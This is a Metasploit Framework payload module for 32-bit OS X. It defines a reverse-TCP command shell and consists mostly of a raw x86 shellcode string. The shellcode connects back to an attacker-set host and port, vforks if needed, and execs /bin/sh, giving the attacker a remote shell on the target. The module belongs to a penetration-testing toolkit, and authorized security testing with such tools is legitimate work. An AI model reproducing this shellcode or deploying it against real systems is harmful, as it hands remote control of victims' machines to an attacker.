##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X (vfork) Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker, vfork if necessary, and spawn a command shell',
      'Author'        => 'ddz',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 20, 'ADDR' ],
              'LPORT'    => [ 27, 'n'    ],
            },
          'Payload' =>
            "\x31\xc0\x99\x50\x40\x50\x40\x50"+
            "\x52\xb0\x61\xcd\x80\x72\x6d\x89"+
            "\xc7\x52\x52\x68\x7f\x00\x00\x01"+
            "\x68\x00\x02\x34\x12\x89\xe3\x6a"+
            "\x10\x53\x57\x52\xb0\x62\xcd\x80"+
            "\x72\x52\x31\xdb\x83\xeb\x01\x43"+
            "\x53\x57\x53\xb0\x5a\xcd\x80\x72"+
            "\x43\x83\xfb\x03\x75\xf1\x31\xc0"+
            "\x50\x50\x50\x50\xb0\x3b\xcd\x80"+
            "\x90\x90\x3c\x2d\x75\x09\xb0\x42"+
            "\xcd\x80\x83\xfa\x00\x74\x17\x31"+
            "\xc0\x50\x68\x2f\x2f\x73\x68\x68"+
            "\x2f\x62\x69\x6e\x89\xe3\x50\x50"+
            "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"+
            "\x50\x89\xe3\x50\x50\x53\x50\x50"+
            "\xb0\x07\xcd\x80\x31\xc0\x50\x50"+
            "\x40\xcd\x80"
        }
    ))
  end

end
